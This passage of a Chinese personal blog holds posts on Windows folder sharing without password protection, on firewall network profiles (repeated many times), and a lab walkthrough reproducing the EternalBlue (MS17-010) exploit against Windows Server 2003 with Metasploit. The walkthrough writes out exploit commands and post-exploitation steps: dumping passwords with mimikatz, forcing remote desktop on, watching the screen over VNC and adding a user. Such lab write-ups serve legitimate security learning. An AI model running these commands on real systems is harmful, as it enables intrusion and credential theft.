+<h4 id="5-完成共享-5"><a href="#5-完成共享-5" class="headerlink" title="5. 完成共享"></a>5. 完成共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108190642003-174898197.png" width="40%" >
+
+<h4 id="6-在另一台电脑上进行访问-5"><a href="#6-在另一台电脑上进行访问-5" class="headerlink" title="6. 在另一台电脑上进行访问"></a>6. 在另一台电脑上进行访问</h4><p>首先需要知道这台电脑的ip地址或者主机名， </p>
+<p>cmd中输入命令 <code>ipconfig /all</code> 可查看ip地址和主机名</p>
+<h5 id="主机名：-5"><a href="#主机名：-5" class="headerlink" title="主机名："></a>主机名：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108192915322-1891611902.png" width="40%" >
+
+<h5 id="ip地址：-5"><a href="#ip地址：-5" class="headerlink" title="ip地址："></a>ip地址：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193125484-1928555331.png" width="40%" >
+
+
+<p>在另一台电脑上通过 <code>\\ip</code> 或者 <code>\\主机名</code> 进行访问</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193204133-1479520416.png" width="40%" >
+或者
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193254323-1864526596.png" width="40%" >
+
+
+<p>最后输入这台电脑的用户名和密码即可</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193409346-2032174493.png" width="40%" >
+
+
+<h4 id="7-配置无需用户名和密码访问-5"><a href="#7-配置无需用户名和密码访问-5" class="headerlink" title="7. 配置无需用户名和密码访问"></a>7. 配置无需用户名和密码访问</h4><p>在这台电脑上找到共享文件夹 右击属性选择共享，点击网络和共享中心：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193527212-1579471211.png" width="40%" >
+
+
+<p>找到密码保护的共享，选择无密码保护的共享</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193633215-571151121.png" width="40%" >
+
+
+
+<p>接下来访问就不需要用户名和密码了</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193735170-1641673344.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17035135.html
+
+
+
+
+<hr>
+<p>title: ‘windows共享文件夹并设置免密码访问-junlin623’<br>date: 2023-01-08 19:44:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h4 id="1-右击文件选择属性-6"><a href="#1-右击文件选择属性-6" class="headerlink" title="1. 右击文件选择属性"></a>1. 右击文件选择属性</h4><h4 id="2-点击共享-6"><a href="#2-点击共享-6" class="headerlink" title="2. 点击共享"></a>2. 点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182431486-527793496.png" width="40%" >
+
+<h4 id="3-选择-everyone用户，表示任何人都可以访问这个文件夹-6"><a href="#3-选择-everyone用户，表示任何人都可以访问这个文件夹-6" class="headerlink" title="3. 选择 everyone用户，表示任何人都可以访问这个文件夹"></a>3. 选择 everyone用户，表示任何人都可以访问这个文件夹</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182540456-379028717.png" width="40%" >
+
+<h4 id="4-赋予相应权限，点击共享-6"><a href="#4-赋予相应权限，点击共享-6" class="headerlink" title="4. 赋予相应权限，点击共享"></a>4. 赋予相应权限，点击共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108182638198-1841928725.png" width="40%" >
+
+<h4 id="5-完成共享-6"><a href="#5-完成共享-6" class="headerlink" title="5. 完成共享"></a>5. 完成共享</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108190642003-174898197.png" width="40%" >
+
+<h4 id="6-在另一台电脑上进行访问-6"><a href="#6-在另一台电脑上进行访问-6" class="headerlink" title="6. 在另一台电脑上进行访问"></a>6. 在另一台电脑上进行访问</h4><p>首先需要知道这台电脑的ip地址或者主机名， </p>
+<p>cmd中输入命令 <code>ipconfig /all</code> 可查看ip地址和主机名</p>
+<h5 id="主机名：-6"><a href="#主机名：-6" class="headerlink" title="主机名："></a>主机名：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108192915322-1891611902.png" width="40%" >
+
+<h5 id="ip地址：-6"><a href="#ip地址：-6" class="headerlink" title="ip地址："></a>ip地址：</h5><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193125484-1928555331.png" width="40%" >
+
+
+<p>在另一台电脑上通过 <code>\\ip</code> 或者 <code>\\主机名</code> 进行访问</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193204133-1479520416.png" width="40%" >
+或者
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193254323-1864526596.png" width="40%" >
+
+
+<p>最后输入这台电脑的用户名和密码即可</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193409346-2032174493.png" width="40%" >
+
+
+<h4 id="7-配置无需用户名和密码访问-6"><a href="#7-配置无需用户名和密码访问-6" class="headerlink" title="7. 配置无需用户名和密码访问"></a>7. 配置无需用户名和密码访问</h4><p>在这台电脑上找到共享文件夹 右击属性选择共享，点击网络和共享中心：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193527212-1579471211.png" width="40%" >
+
+
+<p>找到密码保护的共享，选择无密码保护的共享</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193633215-571151121.png" width="40%" >
+
+
+
+<p>接下来访问就不需要用户名和密码了</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230108193735170-1641673344.png" width="40%" >
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/windows%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%85%8D%E5%AF%86%E7%A0%81%E8%AE%BF%E9%97%AE-junlin623/" data-id="clhrwf8jd001feksz58x5575c" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Windows2003复现永恒之蓝漏洞-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/Windows2003%E5%A4%8D%E7%8E%B0%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.150Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17119813.html">https://www.cnblogs.com/junlin623/p/17119813.html</a></p>
+<hr>
+<p>title: ‘Windows2003复现永恒之蓝漏洞-junlin623’<br>date: 2023-02-14 17:10:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h2 id="一、永恒之蓝漏洞简介"><a href="#一、永恒之蓝漏洞简介" class="headerlink" title="一、永恒之蓝漏洞简介:"></a>一、永恒之蓝漏洞简介:</h2><p>  2017年4月14日晚，黑客团体Shadow Brokers (影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows 系统的SMB漏洞可以获取系统最高权限。</p>
+<p>  5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
+<p>  黑客利用<strong>永恒之蓝工具</strong>成功利用漏洞攻击电脑获取系统<strong>最高权限</strong>后<strong>执行勒索病毒程序</strong>。（自动化）</p>
+<blockquote>
+<p><strong>445端口简介：</strong><br>445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉! 2017年10月，由于病毒”坏兔子”（勒索病毒）来袭，国家互联网应急中心等安全机构建议用户及时关闭计算机以及网络设备上的445和139端口 。</p>
+</blockquote>
+<h2 id="二、设备："><a href="#二、设备：" class="headerlink" title="二、设备："></a>二、设备：</h2><p>攻击机：Kali                    ip：192.168.1.103<br>靶机：  Window Servler 2003     ip: 192.168.1.104</p>
+<h2 id="三、漏洞复现："><a href="#三、漏洞复现：" class="headerlink" title="三、漏洞复现："></a>三、漏洞复现：</h2><h3 id="1-启动msf"><a href="#1-启动msf" class="headerlink" title="1. 启动msf"></a>1. 启动msf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214154315802-2020362843.png" width="40%" >
+
+
+<h3 id="2-搜索永恒之蓝（ms17-010）"><a href="#2-搜索永恒之蓝（ms17-010）" class="headerlink" title="2. 搜索永恒之蓝（ms17-010）"></a>2. 搜索永恒之蓝（ms17-010）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214154709594-248157865.png" width="60%" >
+
+
+<h3 id="3-使用auxiliary辅助模块判断目标主机是否存在该漏洞"><a href="#3-使用auxiliary辅助模块判断目标主机是否存在该漏洞" class="headerlink" title="3. 使用auxiliary辅助模块判断目标主机是否存在该漏洞"></a>3. 使用auxiliary辅助模块判断目标主机是否存在该漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 3    <span class="comment"># 使用上图中序号为3的那个模块</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.1.104   <span class="comment"># 设置目的主机ip</span></span><br><span class="line">show options   <span class="comment"># 查看设置</span></span><br><span class="line">run   <span class="comment"># 执行</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214155432072-1751589343.png" width="60%" >
+
+
+<p> Host is likely VULNERABLE to MS17-010! - Windows Server 2003 3790 Service Pack 2 x86 (32-bit)<br>证明目标主机大概率存在该漏洞</p>
+<h3 id="4-使用攻击模块exploit进行渗透"><a href="#4-使用攻击模块exploit进行渗透" class="headerlink" title="4. 使用攻击模块exploit进行渗透"></a>4. 使用攻击模块exploit进行渗透</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 1   <span class="comment"># 这个如果不行就用搜索出来的其他的攻击模块</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.1.104  <span class="comment"># 设置目标主机ip</span></span><br><span class="line">run  <span class="comment"># 执行</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214155723050-774404814.png" width="60%" >
+
+<p>可以看到已经成功进入目标主机中</p>
+<h3 id="5-攻击成功之后的操作"><a href="#5-攻击成功之后的操作" class="headerlink" title="5. 攻击成功之后的操作"></a>5. 攻击成功之后的操作</h3><h4 id="查看远程主机信息"><a href="#查看远程主机信息" class="headerlink" title="查看远程主机信息"></a>查看远程主机信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig  <span class="comment"># 查看远程主机网卡信息</span></span><br><span class="line">ps  <span class="comment"># 查看进程</span></span><br><span class="line">migrate  <span class="comment"># 转到相应的进程</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214160958554-866776369.png" width="60%" >
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214161018817-358347953.png" width="60%" >
+
+
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>portfwd命令是meterpreter内嵌的端口转发器，一般在目标主机开放的端口不允许直接访问的情况下使用，比如说，目标主机开放的远程桌面3389端口只允许内网访问，这时可以使用portfwd命令进行端口转发，以达到直接访问目标主机的目的。</p>
+<p>此时在windows server 2003中用小皮面板开启80端口进行访问</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214161506540-749722566.png" width="60%" >
+
+
+<p>如果目标主机开启了防火墙，我们就无法通过(远程主机ip:80)的方式访问了，此时就需要在攻击机中进行<strong>端口转发</strong>了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 12345是我们想要访问的端口号，随便设置一个没有被使用的就好，如果用了其他程序使用的端口会不起作用</span></span><br><span class="line">portfwd add -l 12345-r 192.168.1.104 -p 80</span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214162524104-639819752.png" width="60%" >
+
+<p>在攻击机上访问网页（访问地址：127.0.0.1:12345）：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214162606711-487287543.png" width="60%" >
+
+<h4 id="获取远程主机的屏幕数据"><a href="#获取远程主机的屏幕数据" class="headerlink" title="获取远程主机的屏幕数据"></a>获取远程主机的屏幕数据</h4><p><code>screenshot</code></p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214163030075-193101687.png" width="60%" >
+
+
+<h4 id="获取密码、哈希值"><a href="#获取密码、哈希值" class="headerlink" title="获取密码、哈希值"></a>获取密码、哈希值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz   <span class="comment"># 使用 mimikatz插件</span></span><br><span class="line">creds_all       <span class="comment"># 拿到密码</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214163240701-1120361366.png" width="60%" >
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214163331716-655322635.png" width="60%" >
+
+
+<h4 id="强制允许主机被远程访问"><a href="#强制允许主机被远程访问" class="headerlink" title="强制允许主机被远程访问"></a>强制允许主机被远程访问</h4><p>关闭远程桌面：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214163802555-479230894.png" width="50%" >
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214164158102-1397261614.png" width="50%" >
+
+
+<p>可以看到远程桌面被强制开启：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214164113463-1325783707.png" width="50%" >
+
+<p>在kali中直接通过前面拿到的密码进行远程连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.1.104</span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214164451259-255293780.png" width="50%" >
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214164526814-2102181196.png" width="50%" >
+
+<p>或者直接运行msf的vnc模块（不能进行操作，能够看到对方正在做什么）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run vnc</span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214165726802-1807773472.png" width="50%" >
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214165701753-951759113.png" width="50%" >
+
+
+<h4 id="直接操作主机的cmd"><a href="#直接操作主机的cmd" class="headerlink" title="直接操作主机的cmd"></a>直接操作主机的cmd</h4><p>执行 <code>shell</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以修改密码，添加用户、为用户提权等操作</span></span><br><span class="line">net user haha 12345 /add</span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202302/2935791-20230214170318761-329542161.png" width="60%" >
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/Windows2003%E5%A4%8D%E7%8E%B0%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E-junlin623/" data-id="clhrwf8j30012eksz8lzz2hgf" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Windows Defender防火墙允许的应用和功能中专用和公用选项是什么意思？-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/Windows%20Defender%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%81%E8%AE%B8%E7%9A%84%E5%BA%94%E7%94%A8%E5%92%8C%E5%8A%9F%E8%83%BD%E4%B8%AD%E4%B8%93%E7%94%A8%E5%92%8C%E5%85%AC%E7%94%A8%E9%80%89%E9%A1%B9%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.148Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17026275.html">https://www.cnblogs.com/junlin623/p/17026275.html</a></p>
+<hr>
+<p>title: ‘Windows Defender防火墙允许的应用和功能中专用和公用选项是什么意思？-junlin623’<br>date: 2023-01-04 23:04:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104224838764-1158143991.png" width="60%" >
+
+
+<p>这里的专用和公用是指防火墙是否允许特定应用在专用或者公用网络中进行通信</p>
+<h4 id="什么是专用和公用网络？"><a href="#什么是专用和公用网络？" class="headerlink" title="什么是专用和公用网络？"></a>什么是专用和公用网络？</h4><p>下面是windows给我们定义的：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225328305-320597347.png" width="30%" >
+
+<p>这个定义并不是绝对的，只是windows给了我们两个选项，我们可以自行设定我们所在的网络是专用还是公用，然后我们可以给专用网络和公用网络特定的权限，进而对某个网络的权限进行了设置，比如家里的网络我们设置成专用网络，权限是启用网络发现； 图书馆等公共场所的网络我们可以设置成公用网络，权限是不启用网络发现，让其他设备无法访问到你并且无法进行文件共享等</p>
+<h4 id="设置所属网络属于专用还是公用网络："><a href="#设置所属网络属于专用还是公用网络：" class="headerlink" title="设置所属网络属于专用还是公用网络："></a>设置所属网络属于专用还是公用网络：</h4><p>我当前所连接的网络属于专用网络</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104230135469-1050197392.png" width="40%" >
+
+<h4 id="对当前网络配置文件中专用网络和公用网络的权限进行设置："><a href="#对当前网络配置文件中专用网络和公用网络的权限进行设置：" class="headerlink" title="对当前网络配置文件中专用网络和公用网络的权限进行设置："></a>对当前网络配置文件中专用网络和公用网络的权限进行设置：</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225914824-1098693117.png" width="40%" >
+
+<p>以下是关闭专用网络中网络发现后在windows资源管理器中访问网络的结果：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104232203890-196388957.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17026275.html
+
+
+
+
+<hr>
+<p>title: ‘Windows Defender防火墙允许的应用和功能中专用和公用选项是什么意思？-junlin623’<br>date: 2023-01-04 23:04:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104224838764-1158143991.png" width="60%" >
+
+
+<p>这里的专用和公用是指防火墙是否允许特定应用在专用或者公用网络中进行通信</p>
+<h4 id="什么是专用和公用网络？-1"><a href="#什么是专用和公用网络？-1" class="headerlink" title="什么是专用和公用网络？"></a>什么是专用和公用网络？</h4><p>下面是windows给我们定义的：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225328305-320597347.png" width="30%" >
+
+<p>这个定义并不是绝对的，只是windows给了我们两个选项，我们可以自行设定我们所在的网络是专用还是公用，然后我们可以给专用网络和公用网络特定的权限，进而对某个网络的权限进行了设置，比如家里的网络我们设置成专用网络，权限是启用网络发现； 图书馆等公共场所的网络我们可以设置成公用网络，权限是不启用网络发现，让其他设备无法访问到你并且无法进行文件共享等</p>
+<h4 id="设置所属网络属于专用还是公用网络：-1"><a href="#设置所属网络属于专用还是公用网络：-1" class="headerlink" title="设置所属网络属于专用还是公用网络："></a>设置所属网络属于专用还是公用网络：</h4><p>我当前所连接的网络属于专用网络</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104230135469-1050197392.png" width="40%" >
+
+<h4 id="对当前网络配置文件中专用网络和公用网络的权限进行设置：-1"><a href="#对当前网络配置文件中专用网络和公用网络的权限进行设置：-1" class="headerlink" title="对当前网络配置文件中专用网络和公用网络的权限进行设置："></a>对当前网络配置文件中专用网络和公用网络的权限进行设置：</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225914824-1098693117.png" width="40%" >
+
+<p>以下是关闭专用网络中网络发现后在windows资源管理器中访问网络的结果：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104232203890-196388957.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17026275.html
+
+
+
+
+<hr>
+<p>title: ‘Windows Defender防火墙允许的应用和功能中专用和公用选项是什么意思？-junlin623’<br>date: 2023-01-04 23:04:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104224838764-1158143991.png" width="60%" >
+
+
+<p>这里的专用和公用是指防火墙是否允许特定应用在专用或者公用网络中进行通信</p>
+<h4 id="什么是专用和公用网络？-2"><a href="#什么是专用和公用网络？-2" class="headerlink" title="什么是专用和公用网络？"></a>什么是专用和公用网络？</h4><p>下面是windows给我们定义的：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225328305-320597347.png" width="30%" >
+
+<p>这个定义并不是绝对的，只是windows给了我们两个选项，我们可以自行设定我们所在的网络是专用还是公用，然后我们可以给专用网络和公用网络特定的权限，进而对某个网络的权限进行了设置，比如家里的网络我们设置成专用网络，权限是启用网络发现； 图书馆等公共场所的网络我们可以设置成公用网络，权限是不启用网络发现，让其他设备无法访问到你并且无法进行文件共享等</p>
+<h4 id="设置所属网络属于专用还是公用网络：-2"><a href="#设置所属网络属于专用还是公用网络：-2" class="headerlink" title="设置所属网络属于专用还是公用网络："></a>设置所属网络属于专用还是公用网络：</h4><p>我当前所连接的网络属于专用网络</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104230135469-1050197392.png" width="40%" >
+
+<h4 id="对当前网络配置文件中专用网络和公用网络的权限进行设置：-2"><a href="#对当前网络配置文件中专用网络和公用网络的权限进行设置：-2" class="headerlink" title="对当前网络配置文件中专用网络和公用网络的权限进行设置："></a>对当前网络配置文件中专用网络和公用网络的权限进行设置：</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225914824-1098693117.png" width="40%" >
+
+<p>以下是关闭专用网络中网络发现后在windows资源管理器中访问网络的结果：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104232203890-196388957.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17026275.html
+
+
+
+
+<hr>
+<p>title: ‘Windows Defender防火墙允许的应用和功能中专用和公用选项是什么意思？-junlin623’<br>date: 2023-01-04 23:04:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104224838764-1158143991.png" width="60%" >
+
+
+<p>这里的专用和公用是指防火墙是否允许特定应用在专用或者公用网络中进行通信</p>
+<h4 id="什么是专用和公用网络？-3"><a href="#什么是专用和公用网络？-3" class="headerlink" title="什么是专用和公用网络？"></a>什么是专用和公用网络？</h4><p>下面是windows给我们定义的：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225328305-320597347.png" width="30%" >
+
+<p>这个定义并不是绝对的，只是windows给了我们两个选项，我们可以自行设定我们所在的网络是专用还是公用，然后我们可以给专用网络和公用网络特定的权限，进而对某个网络的权限进行了设置，比如家里的网络我们设置成专用网络，权限是启用网络发现； 图书馆等公共场所的网络我们可以设置成公用网络，权限是不启用网络发现，让其他设备无法访问到你并且无法进行文件共享等</p>
+<h4 id="设置所属网络属于专用还是公用网络：-3"><a href="#设置所属网络属于专用还是公用网络：-3" class="headerlink" title="设置所属网络属于专用还是公用网络："></a>设置所属网络属于专用还是公用网络：</h4><p>我当前所连接的网络属于专用网络</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104230135469-1050197392.png" width="40%" >
+
+<h4 id="对当前网络配置文件中专用网络和公用网络的权限进行设置：-3"><a href="#对当前网络配置文件中专用网络和公用网络的权限进行设置：-3" class="headerlink" title="对当前网络配置文件中专用网络和公用网络的权限进行设置："></a>对当前网络配置文件中专用网络和公用网络的权限进行设置：</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225914824-1098693117.png" width="40%" >
+
+<p>以下是关闭专用网络中网络发现后在windows资源管理器中访问网络的结果：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104232203890-196388957.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17026275.html
+
+
+
+
+<hr>
+<p>title: ‘Windows Defender防火墙允许的应用和功能中专用和公用选项是什么意思？-junlin623’<br>date: 2023-01-04 23:04:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104224838764-1158143991.png" width="60%" >
+
+
+<p>这里的专用和公用是指防火墙是否允许特定应用在专用或者公用网络中进行通信</p>
+<h4 id="什么是专用和公用网络？-4"><a href="#什么是专用和公用网络？-4" class="headerlink" title="什么是专用和公用网络？"></a>什么是专用和公用网络？</h4><p>下面是windows给我们定义的：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225328305-320597347.png" width="30%" >
+
+<p>这个定义并不是绝对的，只是windows给了我们两个选项，我们可以自行设定我们所在的网络是专用还是公用，然后我们可以给专用网络和公用网络特定的权限，进而对某个网络的权限进行了设置，比如家里的网络我们设置成专用网络，权限是启用网络发现； 图书馆等公共场所的网络我们可以设置成公用网络，权限是不启用网络发现，让其他设备无法访问到你并且无法进行文件共享等</p>
+<h4 id="设置所属网络属于专用还是公用网络：-4"><a href="#设置所属网络属于专用还是公用网络：-4" class="headerlink" title="设置所属网络属于专用还是公用网络："></a>设置所属网络属于专用还是公用网络：</h4><p>我当前所连接的网络属于专用网络</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104230135469-1050197392.png" width="40%" >
+
+<h4 id="对当前网络配置文件中专用网络和公用网络的权限进行设置：-4"><a href="#对当前网络配置文件中专用网络和公用网络的权限进行设置：-4" class="headerlink" title="对当前网络配置文件中专用网络和公用网络的权限进行设置："></a>对当前网络配置文件中专用网络和公用网络的权限进行设置：</h4><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225914824-1098693117.png" width="40%" >
+
+<p>以下是关闭专用网络中网络发现后在windows资源管理器中访问网络的结果：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104232203890-196388957.png" width="40%" >
+https://www.cnblogs.com/junlin623/p/17026275.html
+
+
+
+
+<hr>
+<p>title: ‘Windows Defender防火墙允许的应用和功能中专用和公用选项是什么意思？-junlin623’<br>date: 2023-01-04 23:04:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104224838764-1158143991.png" width="60%" >
+
+
+<p>这里的专用和公用是指防火墙是否允许特定应用在专用或者公用网络中进行通信</p>
+<h4 id="什么是专用和公用网络？-5"><a href="#什么是专用和公用网络？-5" class="headerlink" title="什么是专用和公用网络？"></a>什么是专用和公用网络？</h4><p>下面是windows给我们定义的：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230104225328305-320597347.png" width="30%" >
+
+<p>这个定义并不是绝对的，只是windows给了我们两个选项，我们可以自行设定我们所在的网络是专用还是公用，然后我们可以给专用网络和公用网络特定的权限，进而对某个网络的权限进行了设置，比如家里的网络我们设置成专用网络，权限是启用网络发现； 图书馆等公共场所的网络我们可以设置成公用网络，权限是不启用网络发现，让其他设备无法访问到你并且无法进行文件共享等</p>
